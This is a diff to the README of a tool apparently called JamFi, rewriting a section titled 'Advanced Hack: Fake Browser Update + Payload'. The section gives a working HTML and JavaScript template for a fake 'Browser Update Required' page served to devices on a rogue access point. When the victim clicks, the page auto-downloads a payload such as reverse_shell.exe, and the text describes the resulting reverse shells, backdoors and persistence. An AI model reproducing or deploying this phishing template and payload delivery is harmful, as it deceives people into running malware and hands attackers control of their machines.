@@ -138,17 +138,16 @@ loot/creds.txt
 
 -------------------------------------------------------------------------------------------------------------------
 
-## 🔐 Advanced User Trick: Fake Browser Update + Payload (Optional)
-
+🔐 **Advanced Hack: Fake Browser Update + Payload (Optional)**  
 JamFi lets you simulate a fake browser update prompt using pure HTML + JavaScript — no Flipper or Rubber Ducky required!
 
-Once a device connects to your Evil AP, redirect them to a custom update page by editing:
-
-loot/injection.html
+Once a device connects to your Evil AP, redirect them to a custom update page by editing:  
+`loot/injection.html`
 
 Here’s a simple example:
 
-````<!-- loot/injection.html -->
+```html
+<!-- loot/injection.html -->
 <h2>🔒 Browser Update Required</h2>
 <p>To continue browsing, please install the latest security patch.</p>
 <button onclick="downloadUpdate()">Update Now</button>
@@ -162,10 +161,9 @@ function downloadUpdate() {
   a.click();
 }
 </script>
+```
 
-Place your payload in the loot/ folder as:
-
-fake_update.exe
+Just place your payload (like `reverse_shell.exe`) in the `loot/` folder and it will auto-download when the user clicks "Update Now".
 
 You now have a simulated Remote Code Execution (RCE) opportunity: if the victim downloads and runs the file, you can trigger reverse shells, backdoors, or persistence depending on your setup.
 
